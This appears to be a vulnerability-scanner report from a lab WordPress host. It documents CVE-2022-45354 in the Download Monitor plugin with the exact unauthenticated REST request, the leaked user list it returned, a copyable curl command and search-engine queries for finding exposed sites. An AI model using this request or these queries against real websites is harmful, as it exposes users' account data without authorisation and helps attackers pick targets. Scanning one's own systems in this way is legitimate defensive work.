### Download Monitor <= 4.7.60 - Sensitive Information Exposure via REST API (CVE-2022-45354:version) found on http://wordpress.lan

----
**Details**: **CVE-2022-45354:version** matched at http://wordpress.lan

**Protocol**: HTTP

**Full URL**: http://wordpress.lan/wp-content/plugins/download-monitor/readme.txt

**Timestamp**: Tue Jul 11 09:09:59 +0000 UTC 2023

**Template Information**

| Key | Value |
| --- | --- |
| Name | Download Monitor <= 4.7.60 - Sensitive Information Exposure via REST API |
| Authors | topscoder |
| Tags | cve, wordpress, wp-plugin, download-monitor, medium |
| Severity | medium |
| Description | The Download Monitor plugin for WordPress is vulnerable to Sensitive Information Exposure in versions up to, and including, 4.7.60 via REST API. This can allow unauthenticated attackers to extract sensitive data including user reports, download reports, and user data including email, role, id and other info (not passwords) |
| CVSS-Metrics | [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N) |
| CVE-ID | [CVE-2022-45354](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2022-45354) |
| CVSS-Score | 5.40 |
| fofa-query | wp-content/plugins/download-monitor/ |
| google-query | inurl:"/wp-content/plugins/download-monitor/" |
| shodan-query | vuln:CVE-2022-45354 |

**Request**
```http
GET /wp-json/download-monitor/v1/user_data HTTP/1.1
Host: wordpress.lan
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 200 OK
Date: Tue, 11 Jul 2023 09:46:18 GMT
Server: Apache/2.4.56 (Debian)
X-Powered-By: PHP/8.0.28
dlm-no-waypoints: true
X-Robots-Tag: noindex
Link: <http://wordpress.lan/wp-json/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Allow: GET
Vary: Origin
Content-Length: 1108
Connection: close
Content-Type: application/json

[
   {
      "id": "1",
      "nicename": "admin",
      "url": "http://wordpress.lan",
      "registered": "2023-01-16 13:29:36",
      "display_name": "admin",
      "role": ""
   },
   {
      "id": "8",
      "nicename": "agent",
      "url": "",
      "registered": "2023-07-06 08:09:15",
      "display_name": "agent",
      "role": [
         "subscriber"
      ]
   },
   {
      "id": "3",
      "nicename": "debra_moran",
      "url": "",
      "registered": "2023-06-13 08:32:47",
      "display_name": "Debra Moran",
      "role": [
         "wdk_agent"
      ]
   },
   {
      "id": "4",
      "nicename": "garry_novan",
      "url": "",
      "registered": "2023-06-13 08:32:47",
      "display_name": "Garry Novan",
      "role": [
         "wdk_agent"
      ]
   },
   {
      "id": "5",
      "nicename": "kety_spear",
      "url": "",
      "registered": "2023-06-13 08:32:47",
      "display_name": "Kety Spear",
      "role": [
         "wdk_agent"
      ]
   },
   {
      "id": "7",
      "nicename": "tagent",
      "url": "",
      "registered": "2023-07-06 08:09:14",
      "display_name": "tagent",
      "role": [
         "subscriber"
      ]
   },
   {
      "id": "9",
      "nicename": "test",
      "url": "",
      "registered": "2023-07-06 09:56:31",
      "display_name": "test",
      "role": []
   },
   {
      "id": "6",
      "nicename": "rob",
      "url": "",
      "registered": "2023-06-28 13:36:56",
      "display_name": "rob",
      "role": [
         "subscriber"
      ]
   },
   {
      "id": "2",
      "nicename": "user",
      "url": "",
      "registered": "2023-06-06 08:20:31",
      "display_name": "user name",
      "role": [
         "subscriber"
      ]
   }
]
```



**CURL command**
```sh
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' 'http://wordpress.lan/wp-json/download-monitor/v1/user_data'
```

----
